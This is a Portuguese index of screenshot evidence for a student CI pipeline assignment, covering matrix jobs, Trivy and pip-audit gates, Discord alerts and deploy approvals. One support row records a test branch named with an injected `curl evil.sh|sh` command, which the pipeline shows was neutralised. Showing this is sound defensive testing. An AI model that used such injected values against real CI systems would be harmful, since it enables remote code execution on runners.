# Evidências da entrega — Atividade 1 (CI)

Índice das capturas que comprovam cada requisito do pipeline. A tabela
*Evidências da entrega* do README principal é o resumo; este arquivo é o mapa
completo, com o que cada imagem mostra e onde ela foi capturada.

**Convenção de nome:** `evidencia_NN_assunto.png` para as numeradas,
`extras/assunto.png` para o material de apoio que não entra na tabela.

---

## As quinze evidências

| # | Arquivo | O que mostra | Onde foi capturado | Linha da tabela | Status |
|---|---|---|---|---|---|
| 01 | `evidencia_01_ci_checks_verdes.png` | Os quatro checks `Required` verdes e o merge bloqueado por revisão de code owner | PR #2 → Conversation | — | ✅ |
| 02 | `evidencia_02_matrix_paralela.png` | Os três jobs da matrix expandidos, iniciando no mesmo segundo | Actions → run → grafo com *Show all jobs* | 4 | 🔁 refazer |
| 03 | `evidencia_03_trivy_security.png` | Alertas do Trivy com as três categorias `trivy-python-3.1x` | Security and quality → Code scanning | 6 | ⏳ PR da demo |
| 04 | `evidencia_04_discord_sucesso.png` | Card verde no canal, com commit, SHA e os três gates | Discord → `#geral` | 7 | ⏳ após PR do card |
| 05 | `evidencia_05_deploy_waiting.png` | Job em *Waiting*, botão *Review deployments* e a tabela *Deployment protection rules* | Actions → run #3 | 5 | ✅ |
| 06 | `evidencia_06_deploy_aprovado.png` | Banner *The deployments have been approved* e o log do job com `Target: ***` | Actions → run #3 → job do deploy | 5 | ✅ |
| 07 | `evidencia_07_pipeline_verde_main.png` | Os seis jobs concluídos na `main`, deploy incluído | Actions → run #3 | 1 | ✅ |
| 08 | `evidencia_08_required_checks.png` | Ruleset salvo com os quatro checks obrigatórios | Settings → Rules → `main protection` | — | ⏳ |
| 09 | `evidencia_09_cache_hit.png` | A linha `Cache restored from key:` e a queda no tempo do job | Actions → segundo run → step *Cache pip downloads* | 4 | ⏳ PR do card |
| 10 | `evidencia_10_badge_verde.png` | Badge do CI verde no topo do README | Code → README na `main` | — | ⏳ após PR do README |
| 11 | `evidencia_11_pr_corrigido_verde.png` | O mesmo PR verde e mergeável depois do bump | PR do ensaio shift-left | 3 | ⏳ |
| 12 | `evidencia_12_merge_bloqueado.png` | Check vermelho e botão de merge cinza com *Required statuses must pass* | PR da demo | 2 | ⏳ PR da demo |
| 13 | `evidencia_13_pip_audit_cves.png` | Os três CVEs do `requests` e as versões de correção | PR da demo → step *Audit dependencies* | 2 | ⏳ PR da demo |
| 14 | `evidencia_14_trivy_bloqueio.png` | O Trivy reprovando os mesmos CVEs, com severidade `MEDIUM` | PR da demo → step do Trivy | 6 | ⏳ PR da demo |
| 15 | `evidencia_15_discord_falha.png` | Card vermelho no canal, com o gate que falhou | Discord → `#geral` | 7 | ⏳ PR da demo |

---

## Material de apoio

Não entra na tabela do README, mas sustenta duas seções dele.

| Arquivo | O que mostra | Onde é citado |
|---|---|---|
| `extras/sarif_upload_no_pr.png` | O check `GitHub Advanced Security / Trivy` reportando no PR — prova que o SARIF sobe mesmo quando não há alerta | Seção do Trivy, em *Arquivo por arquivo* |
| `extras/injecao_neutralizada.png` | Notificação disparada por uma branch chamada `x";curl evil.sh\|sh;"`, entregue como texto e não como comando | Seção de segurança, no job `notify` |

---

## Legendas prontas

Texto para colar junto de cada imagem, porque print sem leitura é só print.

**02 — matrix paralela**
> Os três jobs iniciam no mesmo segundo (`00:25:44`) e o último termina em
> `00:26:30`. Somadas, as três pernas custam 134 s; em paralelo, o conjunto leva
> 46 s. O `fail-fast: false` garante que uma versão quebrada não cancela as outras.

**06 — deploy aprovado**
> A linha `Target: ***` é o secret de environment `STAGING_URL` mascarado pelo
> runner. O valor não aparece no log nem para quem tem acesso ao repositório.

**03 — Trivy no Code scanning**
> As três categorias `trivy-python-3.10`, `3.11` e `3.12` vêm do parâmetro
> `category` do `upload-sarif`. Sem ele, os três uploads do mesmo commit se
> sobrescreveriam e só uma perna da matrix apareceria.

**13 e 14 — os dois gates de segurança**
> O `pip-audit` consulta a base de advisories do PyPI/OSV; o Trivy varre o
> filesystem. Os dois reprovam os mesmos CVEs do `requests 2.31.0`, por caminhos
> diferentes — e as correções apontadas são 2.32.0, 2.32.4 e 2.33.0, o que mostra
> que subir só para 2.32.x não zeraria os três.

---

## Antes de abrir o PR desta pasta

- [ ] Nenhum print com token, URL de webhook, IP ou credencial visível
- [ ] Os quinze arquivos numerados presentes, sem lacuna
- [ ] As sete linhas da tabela do README preenchidas com link ou referência a esta pasta
- [ ] Imagens recortadas na região que interessa — sem barra de tarefas, sem lista de servidores
